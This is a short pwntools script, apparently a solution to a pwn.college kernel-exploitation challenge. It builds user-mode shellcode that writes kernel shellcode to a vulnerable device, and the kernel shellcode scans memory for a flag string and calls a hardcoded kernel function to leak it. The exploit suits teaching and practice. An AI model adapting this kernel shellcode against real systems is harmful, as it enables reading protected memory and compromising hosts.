from pwn import *

#binary = "/challenge/babykernel_level12.0"
#p = process(binary)

context.arch = 'amd64'

kernel_shellcode = asm("""
mov rdi, 0xffff888000000000
mov rax, 0xffffffff810b6309
lea rbx, [rip+pwn]
mov rbx, [rbx]
top_of_loop:
cmp rbx, [rdi]
je done
inc rdi
jmp top_of_loop
done:
push rax
push rdi
call rax
pop rdi
pop rax
inc rdi
jmp top_of_loop
ret
pwn:
.string "pwn.college"
""")

user_shellcode = asm("""
mov rax, 1
mov rdi, 3
lea rsi, [rip+kernel_sc]
mov rdx, 0xffff
syscall
ret
kernel_sc:
nop
""")


user_shellcode += kernel_shellcode
f = open("asmfor12", "wb")
f.write(user_shellcode)
f.close()
#p.send(user_shellcode)
#p.interactive()
